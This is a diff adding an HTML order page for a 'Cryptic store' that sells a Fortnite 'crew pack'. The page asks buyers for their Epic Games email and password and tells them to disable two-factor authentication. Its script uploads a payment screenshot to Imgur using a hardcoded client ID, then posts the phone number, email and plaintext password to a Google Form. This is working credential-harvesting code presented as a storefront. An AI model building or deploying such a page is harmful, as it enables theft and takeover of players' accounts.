@@ -1,0 +1,146 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Order - Fortnite</title>
+    <link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans:400,600" rel="stylesheet">
+    <link rel="stylesheet" href="dist/css/style.css">
+	<script src="https://unpkg.com/animejs@3.0.1/lib/anime.min.js"></script>
+    <script src="https://unpkg.com/scrollreveal@4.0.0/dist/scrollreveal.min.js"></script>
+</head>
+<body>
+  <style>
+    body {
+      background-size: cover;
+      background-repeat: no-repeat;
+    }
+    .warning {
+      font-size: 0.9em;
+      color: red;
+    }
+    .back-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #007bff;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .back-button:hover {
+            background-color: #0056b3;
+        }
+        .order-container{
+            border-radius: 100px;
+            height:75%;
+            width: fit-content;
+            display: flex;
+    align-items: center;
+    justify-content: center;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background-color: rgb(43, 41, 41);
+    color: white;
+        }
+        h1{color: white;}
+        button{
+            border-radius: 10px;
+
+        }
+  </style>
+  <a href="index.html" class="back-button">Back to Main</a>
+  <div class="hero-figure-box hero-figure-box-01" data-rotation="45deg"></div>
+  <div class="hero-figure-box hero-figure-box-02" data-rotation="-45deg"></div>
+  <div class="hero-figure-box hero-figure-box-03" data-rotation="0deg"></div>
+  <div class="hero-figure-box hero-figure-box-04" data-rotation="-135deg"></div>
+  <div class="hero-figure-box hero-figure-box-05"></div>
+  <div class="hero-figure-box hero-figure-box-06"></div>
+  <div class="hero-figure-box hero-figure-box-07"></div>
+  <div class="hero-figure-box hero-figure-box-08" data-rotation="-22deg"></div>
+  <div class="hero-figure-box hero-figure-box-09" data-rotation="-52deg"></div>
+  <div class="hero-figure-box hero-figure-box-10" data-rotation="-50deg"></div>
+  <div class="order-container">
+      <h2 class="text-center mb-4" style="color: white;">Fortnite Order Form</h2>
+      <form id="orderForm">
+        <div class="form-group">
+          <label>Phone Number:</label>
+          <input type="text" name="phone" class="form-control" id="phoneno" placeholder="Enter your phone number" required>
+        </div>
+        <div class="form-group">
+          <label>Epic Email:</label>
+          <input type="email" class="form-control" name="email" id="email" placeholder="Enter Epic Games Email" required>
+        </div>
+        <div class="form-group">
+          <label>Epic Password:</label>
+          <input type="password" class="form-control" id="pass" name="pass" placeholder="Enter Epic Games Password" required>
+        </div>
+        <div class="form-group">
+          <label>Money Transaction Image:</label>
+          <input type="file" name="image" id="image" class="form-control">
+        </div>
+        <p class="warning text-danger mt-3">
+          * Please disable 2FA before ordering. Any issues will be communicated via the phone number provided.
+        </p>
+        <button type="submit" class="btn btn-primary btn-block">Submit Order</button>
+        <p style="color: rgb(75, 74, 74);">you are ordering: crew pack.</p>
+      </form>
+    </div>
+    <footer class="site-footer">
+      <div class="container">
+        <div class="row">
+          <div class="col-12 text-center">
+            <p>© 2025 Cryptic store all rights reserved</p>
+          </div>
+        </div>
+      </div>
+    </footer>
+<script>
+document.getElementById("orderForm").addEventListener("submit", function (event) {
+  event.preventDefault();
+
+  const phone = document.getElementById("phoneno").value;
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("pass").value;
+  const orderedItem = "Crew Pack";
+  const imageFile = document.getElementById("image").files[0];
+  const imgurClientId = "acf54432c991faf";
+  const imgurUrl = "https://api.imgur.com/3/image";
+  const formDataImgur = new FormData();
+  formDataImgur.append("image", imageFile);
+
+  fetch(imgurUrl, {
+    method: "POST",
+    headers: { Authorization: `Client-ID ${imgurClientId}` },
+    body: formDataImgur,
+  })
+    .then(response => response.json())
+    .then(data => {
+      if (data.success) {
+        const imgurLink = data.data.link;
+        const googleFormUrl = "https://docs.google.com/forms/d/e/1FAIpQLSdXAz0tB81veQFS5agWc2e-AMZAgJBSp2mSjwxBjDtFVf9f_w/formResponse";
+        const formDataGoogle = new URLSearchParams();
+        formDataGoogle.append("entry.2113520023", phone);
+        formDataGoogle.append("entry.415383044", email);
+        formDataGoogle.append("entry.1206445017", password);
+        formDataGoogle.append("entry.1245685968", imgurLink);
+        formDataGoogle.append("entry.413612230", orderedItem);
+
+        fetch(googleFormUrl, {
+          method: "POST",
+          body: formDataGoogle,
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        })
+      }
+    })
+    .catch(error => {
+      console.error("Error uploading the image:", error);
+    });
+});
+</script>
+</body>
+</html>
